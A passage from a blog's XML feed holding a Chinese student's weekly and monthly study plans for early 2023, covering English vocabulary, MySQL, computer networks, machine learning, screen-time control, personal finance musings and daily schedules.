<li>目前的计划是进行计算机的学习<ol>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
<li>也可以是代码方面<ol>
<li>如前端、后端、</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
<li>复习期末考试</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>时间规划<ol>
<li>一回去先不着急洗澡</li>
</ol>
</li>
<li>睡眠时间<ol>
<li>12:30 - 7:30</li>
<li>7小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.01.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.01.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-01-第二周计划"><a href="#2023-01-第二周计划" class="headerlink" title="2023.01.第二周计划"></a>2023.01.第二周计划</h1><h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>要开始学习了</li>
<li>我觉的要重新思考一下「不背单词」的定位了<ol>
<li>感觉现在就主要是复习单词有点浪费时间</li>
<li>而且要复习完这些单词至少要1个半小时</li>
<li>要调整战略要把背诵新单词为主要的任务</li>
<li>思考几个问题<ol>
<li>什么时候背</li>
<li>背什么</li>
<li>怎么背</li>
</ol>
</li>
<li>把时间</li>
</ol>
</li>
<li>还有娱乐方式问题<ol>
<li>最近一直沉迷于B站</li>
<li>感觉是</li>
</ol>
</li>
<li>要思考一下如何管理电子设备<ol>
<li>感觉可以这个设备管理也要分时段</li>
<li>平板用来娱乐</li>
<li>现在电脑就只能用来学习和工作，不能用来娱乐</li>
<li>手机就进行一些生活方面的工作</li>
</ol>
</li>
<li>还有就是如何处理摸鱼的时间<ol>
<li>就是如何调节学习疲惫的时间</li>
</ol>
</li>
<li>突然领悟一个概念：一次只做一件事<ol>
<li>可以最大限度地利用自身的自控能力</li>
<li>可以以一周为周期</li>
<li>每周只抓取一件事为主要事情，其他为辅助任务，适当完成</li>
<li></li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>本周学完数据库</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><p>1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>复习100个单词</li>
<li>背20个单词</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>学习mysql</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>英语<ol>
<li>背单词</li>
</ol>
</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
<li>目前的计划是进行计算机的学习<ol>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
<li>也可以是代码方面<ol>
<li>如前端、后端、</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡大概10:30</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.01.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.01.3rd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-01-第三周计划"><a href="#2023-01-第三周计划" class="headerlink" title="2023.01.第三周计划"></a>2023.01.第三周计划</h1><h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>要开始学习了</li>
<li>我觉的要重新思考一下「不背单词」的定位了<ol>
<li>感觉现在就主要是复习单词有点浪费时间</li>
<li>而且要复习完这些单词至少要1个半小时</li>
<li>要调整战略要把背诵新单词为主要的任务</li>
<li>思考几个问题<ol>
<li>什么时候背</li>
<li>背什么</li>
<li>怎么背</li>
</ol>
</li>
<li>把时间</li>
</ol>
</li>
<li>还有娱乐方式问题<ol>
<li>最近一直沉迷于B站</li>
<li>感觉是</li>
</ol>
</li>
<li>要思考一下如何管理电子设备<ol>
<li>感觉可以这个设备管理也要分时段</li>
<li>平板用来娱乐</li>
<li>现在电脑就只能用来学习和工作，不能用来娱乐</li>
<li>手机就进行一些生活方面的工作</li>
</ol>
</li>
<li>还有就是如何处理摸鱼的时间<ol>
<li>就是如何调节学习疲惫的时间</li>
</ol>
</li>
<li>突然领悟一个概念：一次只做一件事<ol>
<li>可以最大限度地利用自身的自控能力</li>
<li>可以以一周为周期</li>
<li>每周只抓取一件事为主要事情，其他为辅助任务，适当完成</li>
<li></li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>本周学完数据库</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><p>1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>复习100个单词</li>
<li>背20个单词</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>学习mysql</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>正常上学的作息</p>
<h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>做阅读</li>
<li>听听力</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>下午的计划是用于科研方向的学习</li>
<li>下午的时间是最重要的学习时间</li>
<li>也就是<ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
</ol>
</li>
<li>目前的计划是进行计算机的学习</li>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>要进行编程技能的刷题（1h)<ol>
<li>只要是熟悉编程语言的操作</li>
<li>可以使用牛客网进行刷题</li>
</ol>
</li>
<li>晚上的时间主要用于编程方面的学习<ol>
<li>学习shell。mysql等</li>
</ol>
</li>
<li>也可以用于学校作业的完成</li>
<li>比如一下其他无所谓的学科作业</li>
<li>还有一些要填写的文件</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.01.4th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.01.4th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-01-第四周计划"><a href="#2023-01-第四周计划" class="headerlink" title="2023.01.第四周计划"></a>2023.01.第四周计划</h1><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><ol>
<li>要开始学习了</li>
<li>还有娱乐方式问题<ol>
<li>最近一直沉迷于B站</li>
<li>解决方案<ol>
<li>不再刷B站</li>
<li>特别是不要看B站热门视频</li>
<li>还有尽量不要用电脑娱乐</li>
<li>可以用pad看电影</li>
<li>一周要休息一下</li>
</ol>
</li>
</ol>
</li>
<li>要思考一下如何管理电子设备<ol>
<li>感觉可以这个设备管理也要分时段</li>
<li>平板用来娱乐</li>
<li>现在电脑就只能用来学习和工作，不能用来娱乐</li>
<li>手机就进行一些生活方面的工作</li>
</ol>
</li>
<li>还有就是如何处理摸鱼的时间<ol>
<li>就是如何调节学习疲惫的时间</li>
</ol>
</li>
<li>突然领悟一个概念：一次只做一件事<ol>
<li>可以最大限度地利用自身的自控能力</li>
<li>可以以一周为周期</li>
<li>每周只抓取一件事为主要事情，其他为辅助任务，适当完成</li>
</ol>
</li>
<li>调整状态<ol>
<li>目前存在的问题<ol>
<li>作息不规律</li>
<li>把时间浪费在没有意义的事情上，如刷视频，玩游戏</li>
</ol>
</li>
<li>解决方案<ol>
<li>白天就去图书馆</li>
<li>晚上</li>
<li>首先就是</li>
</ol>
</li>
</ol>
</li>
<li>要重新思考英语学习的学习方法<ol>
<li>背单词<ol>
<li>现在存在的问题就是<ol>
<li>要复习的单词太多以至于要花费的时长太多了</li>
<li>还有就是没复习完成的单词会一直积累</li>
<li>还有一个就是积累的单词太久没有复习了，以至于忘了意思，导致又要重新学习，又要花费更多的时间</li>
<li>所以要思考一下策略就是到底背单词的总体策略是什么</li>
<li>还有就是在背单词阶段停留太久了，以至于后面的阶段都不好进行，可能要限制一下时间</li>
</ol>
</li>
<li>因为目前处在「不背单词」的阶段，所以主要处理这个阶段的问题<ol>
<li>每天背1小时单词，差不多300词</li>
<li>剩下的单词用其他的时间来背</li>
<li>先把没复习完的单词先复习了</li>
<li>等单词复习完成开始背考研单词</li>
<li>在背单词阶段如果有之前学过的单词就直接标记</li>
</ol>
</li>
</ol>
</li>
<li>听力阶段<ol>
<li>遇到的问题<ol>
<li>无法听出单词</li>
<li>无法记住前面说的话</li>
<li>无法将翻译话串联起来</li>
<li>无法将根据翻译回答问题</li>
</ol>
</li>
<li>方案<ol>
<li>现在首先就是把英语的大部分时间用于练习听力</li>
<li>听力比起阅读更加重要</li>
<li>听力要保持每天都要练习</li>
<li>进行精听训练</li>
<li>就是一句话一句话的听</li>
<li>然后听写，能全部听出来就代表掌握了</li>
<li>以后尽量用电脑完成英语的学习</li>
<li>放弃笔纸化学习，用电脑打字会更好一点</li>
<li>目前的方案是先从刷题网站试一下</li>
</ol>
</li>
</ol>
</li>
<li>阅读<ol>
<li>问题<ol>
<li>段落匹配题没什么把握</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>不要回家</li>
<li>在家就无法正常学习了</li>
<li>要不要有日计划</li>
<li>我觉的可以舍弃毕竟每次日计划都没写什么东西</li>
<li>可以把任务放到滴答清单中</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>本周学完数据库</li>
<li>把单词清空</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><p>1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>复习100个单词</li>
<li>背20个单词</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>学习mysql</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>寒假在家作息</p>
<h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>8点起床</li>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>听听力</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>下午的计划是用于科研方向的学习</li>
<li>下午的时间是最重要的学习时间</li>
<li>也就是<ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
</ol>
</li>
<li>目前的计划是进行计算机的学习</li>
<li>进行专业知识的学习<ol>
<li>可以同时学习两门课程，避免大脑疲劳</li>
</ol>
</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>将下午所学的知识进行整理，整理成笔记</li>
<li>同时进行刷题练习，好掌握知识</li>
<li>处理一下杂碎的事情</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 8:00（理想）</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.01.MonthlyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.01.MonthlyPlan/</url>
    <content><![CDATA[<h1 id="2022-12月计划"><a href="#2022-12月计划" class="headerlink" title="2022.12月计划"></a>2022.12月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><h2 id="本月重点"><a href="#本月重点" class="headerlink" title="本月重点"></a>本月重点</h2><ul>
<li>复习期末考试</li>
<li></li>
</ul>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="计算机专业知识"><a href="#计算机专业知识" class="headerlink" title="计算机专业知识"></a>计算机专业知识</h3><ul>
<li>机器学习看完 <ul>
<li>了解大部分算法的原理</li>
<li>学会如何使用这些算法</li>
<li>还要学会如何调整参数</li>
</ul>
</li>
<li>计算机网络打算等假期在看 <ul>
<li>操作系统看看有没有时间搞</li>
<li>在此之前还要把数据库学完</li>
</ul>
</li>
<li>要开始做研究，</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>只要把大学英语的期末考试应付了就行了</li>
<li></li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li>要开始概率论的期末复习</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul>
<li>要开始java的复习</li>
<li>可能还要做java的实验</li>
</ul>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.02.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.02.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-02-第一周计划"><a href="#2023-02-第一周计划" class="headerlink" title="2023.02.第一周计划"></a>2023.02.第一周计划</h1><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><ol>
<li><p>还有娱乐方式问题</p>
<ol>
<li>最近一直沉迷于B站</li>
<li>解决方案<ol>
<li>不再刷B站</li>
<li>特别是不要看B站热门视频</li>
<li>还有尽量不要用电脑娱乐</li>
<li>可以用pad看电影</li>
<li>一周要休息一下</li>
</ol>
</li>
</ol>
</li>
<li><p>要思考一下如何管理电子设备</p>
<ol>
<li>手机 —— 生活<ol>
<li>比如支付、健康码、电话、短信等</li>
</ol>
</li>
<li>电脑 —— 工作<ol>
<li>主要是用于写文章、写代码、</li>
</ol>
</li>
<li>平板 —— 学习<ol>
<li>就是替代手机的学习功能</li>
<li>主要是取代纸质方面的学习</li>
</ol>
</li>
</ol>
</li>
<li><p>不要回家</p>
</li>
<li><p>在家就无法正常学习了</p>
</li>
<li><p>为了节省空间把科研栏目和数学放在一起</p>
</li>
<li><p>还有在家就不太会去学习了	</p>
<ol>
<li>不停的看B站</li>
<li>就是不学习看什么都行</li>
</ol>
</li>
<li></li>
<li><p>要重新确定一下娱乐计划</p>
</li>
<li><p>还有如何调整学习计划</p>
</li>
<li><p>终于把MySQL大致学完了</p>
</li>
<li><p>还有一些暂时用不到的就没有学习，比如锁，查看日志，引擎，运维的知识也没有学习</p>
</li>
<li><p>但是一些操作没有去实践，而牛客只能练习ddl和dql的操作，只能是通过做项目来练习了 </p>
</li>
<li><p>还有就是学到现在突然发现我现在学的好像和学校教的“数据库原理”内容好像不完全一样，我的想法是感觉这个数据库原理在考研和项目中好像都用不到就不打算学习了能过就行了</p>
</li>
<li><p>用牛客来巩固数据库的知识就行了</p>
</li>
<li><p>还要思考一下理财</p>
</li>
<li><p>这次不能再投债券型基金了</p>
</li>
<li><p>现在的第一步是减持一些债券型基金了，感觉波动不是太大不好赚钱，同时</p>
</li>
<li><p>还有两支债券该怎么处理，还没有想好</p>
<ol>
<li>感觉要减持一只，只留下一只，到后面可能一只都不留</li>
<li>可能要到很后面的情况下</li>
<li></li>
</ol>
</li>
<li><p>还有就是定投改怎么调整金额，感觉还是不够好</p>
</li>
<li><p>要调整资产分配</p>
</li>
<li><p>现在先定一下今年的理财目标</p>
<ol>
<li>只要收益率达到 10% 就行了</li>
<li>同时要积极调整财产分配</li>
<li>目前的计划是稳健理财中放的都是中低风险的产品</li>
<li>进阶理财中放的中高风险的产品</li>
</ol>
</li>
<li><p>娱乐方式</p>
</li>
<li><p>我觉的现在的娱乐方式还是</p>
</li>
<li><p>还是不要玩游戏比较好</p>
</li>
<li><p>玩游戏容易上头</p>
</li>
<li><p>但是刷短视频又停不下来</p>
</li>
<li><p>虽然我觉得刷B站有点不好，但是这也是少数能停下了的娱乐活动，大多数娱乐活动容易上头</p>
</li>
<li></li>
<li><p>要想一下如何减少娱乐时间</p>
</li>
<li><p>现在主要是嫌少刷B站的时间</p>
</li>
<li><p>同时要减少听音乐的时间，感觉听音乐也是导致失控的原因之一</p>
</li>
<li><p>决定把背单词的任务放到电脑上进行</p>
</li>
<li><p>平板的定位目前还不清楚</p>
</li>
<li><p>如何消遣饭后的时间</p>
</li>
<li><p>可以听音乐，就是听之前没有听过的音乐</p>
</li>
<li><p>可以借此收藏一波歌曲</p>
</li>
<li><p>同时还可以等食物消化，然后在开始工作</p>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li><del>MySQL</del></li>
<li>计算机网络</li>
<li>机器学习</li>
<li><del>理财</del></li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>要学习一下计算机视觉的代码</li>
<li>制作一个简易的图像识别程序</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>准备开始计算机网络的学习</li>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天复习300个单词，直到复习完成以后，然后开始背新单词</li>
<li>剩下的英语学习时间可以用来练习听力</li>
<li>思考一下如何方便的练习阅读</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>MySQL结束学习</li>
<li>开始MySQL刷题模式</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>理财</li>
<li>学习一下ps</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>寒假在家作息</p>
<h3 id="上午（10-00-12-00）"><a href="#上午（10-00-12-00）" class="headerlink" title="上午（10:00-12:00）"></a>上午（10:00-12:00）</h3><ol>
<li>8点起床</li>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>听听力（1h）</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ul>
<li>刷算法题（1h）</li>
</ul>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>学习机器学习（2h）</li>
<li>学习计算机网络（2h）</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>刷编程题（1h）</li>
<li>刷客观题（1h）</li>
</ol>
<h3 id="深夜（24-00-2-00）"><a href="#深夜（24-00-2-00）" class="headerlink" title="深夜（24:00-2:00）"></a>深夜（24:00-2:00）</h3><ol>
<li>睡眠时间<ol>
<li>12:00 - 8:00（理想）</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.02.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.02.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-02-第一周计划"><a href="#2023-02-第一周计划" class="headerlink" title="2023.02.第一周计划"></a>2023.02.第一周计划</h1><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><ol>
<li><p>还有娱乐方式问题</p>
<ol>
<li>最近一直沉迷于B站</li>
<li>解决方案<ol>
<li>不再刷B站</li>
<li>特别是不要看B站热门视频</li>
<li>还有尽量不要用电脑娱乐</li>
<li>可以用pad看电影</li>
<li>一周要休息一下</li>
</ol>
</li>
</ol>
</li>
<li><p>要思考一下如何管理电子设备</p>
<ol>
<li>手机 —— 生活<ol>
<li>比如支付、健康码、电话、短信等</li>
</ol>
</li>
<li>电脑 —— 工作<ol>
<li>主要是用于写文章、写代码、</li>
</ol>
</li>
<li>平板 —— 学习<ol>
<li>就是替代手机的学习功能</li>
<li>主要是取代纸质方面的学习</li>
</ol>
</li>
</ol>
</li>
<li><p>不要回家</p>
</li>
<li><p>在家就无法正常学习了</p>
</li>
<li><p>为了节省空间把科研栏目和数学放在一起</p>
</li>
<li><p>还有在家就不太会去学习了	</p>
<ol>
<li>不停的看B站</li>
<li>就是不学习看什么都行</li>
</ol>
</li>
<li></li>
<li><p>要重新确定一下娱乐计划</p>
</li>
<li><p>还有如何调整学习计划</p>
</li>
<li><p>终于把MySQL大致学完了</p>
</li>
<li><p>还有一些暂时用不到的就没有学习，比如锁，查看日志，引擎，运维的知识也没有学习</p>
</li>
<li><p>但是一些操作没有去实践，而牛客只能练习ddl和dql的操作，只能是通过做项目来练习了 </p>
</li>
<li><p>还有就是学到现在突然发现我现在学的好像和学校教的“数据库原理”内容好像不完全一样，我的想法是感觉这个数据库原理在考研和项目中好像都用不到就不打算学习了能过就行了</p>
</li>
<li><p>用牛客来巩固数据库的知识就行了</p>
</li>
<li><p>还要思考一下理财</p>
</li>
<li><p>这次不能再投债券型基金了</p>
</li>
<li><p>现在的第一步是减持一些债券型基金了，感觉波动不是太大不好赚钱，同时</p>
</li>
<li><p>还有两支债券该怎么处理，还没有想好</p>
<ol>
<li>感觉要减持一只，只留下一只，到后面可能一只都不留</li>
<li>可能要到很后面的情况下</li>
<li></li>
</ol>
</li>
<li><p>还有就是定投改怎么调整金额，感觉还是不够好</p>
</li>
<li><p>要调整资产分配</p>
</li>
<li><p>现在先定一下今年的理财目标</p>
<ol>
<li>只要收益率达到 10% 就行了</li>
<li>同时要积极调整财产分配</li>
<li>目前的计划是稳健理财中放的都是中低风险的产品</li>
<li>进阶理财中放的中高风险的产品</li>
</ol>
</li>
<li><p>娱乐方式</p>
</li>
<li><p>我觉的现在的娱乐方式还是</p>
</li>
<li><p>还是不要玩游戏比较好</p>
</li>
<li><p>玩游戏容易上头</p>
</li>
<li><p>但是刷短视频又停不下来</p>
</li>
<li><p>虽然我觉得刷B站有点不好，但是这也是少数能停下了的娱乐活动，大多数娱乐活动容易上头</p>
</li>
<li></li>
<li><p>要想一下如何减少娱乐时间</p>
</li>
<li><p>现在主要是嫌少刷B站的时间</p>
</li>
<li><p>同时要减少听音乐的时间，感觉听音乐也是导致失控的原因之一</p>
</li>
<li><p>决定把背单词的任务放到电脑上进行</p>
</li>
<li><p>平板的定位目前还不清楚</p>
</li>
<li><p>如何消遣饭后的时间</p>
</li>
<li><p>可以听音乐，就是听之前没有听过的音乐</p>
</li>
<li><p>可以借此收藏一波歌曲</p>
</li>
<li><p>同时还可以等食物消化，然后在开始工作</p>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>计算机网络</li>
<li>机器学习</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>要学习一下计算机视觉的代码</li>
<li>制作一个简易的图像识别程序</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>准备开始计算机网络的学习</li>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天复习300个单词，直到复习完成以后，然后开始背新单词</li>
<li>剩下的英语学习时间可以用来练习听力</li>
<li>思考一下如何方便的练习阅读</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>MySQL结束学习</li>
<li>开始MySQL刷题模式</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>理财</li>
<li>学习一下ps</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>寒假在家作息</p>
<h3 id="上午（10-00-12-00）"><a href="#上午（10-00-12-00）" class="headerlink" title="上午（10:00-12:00）"></a>上午（10:00-12:00）</h3><ol>
<li>8点起床</li>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>听听力（1h）</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ul>
<li>刷算法题（1h）</li>
</ul>
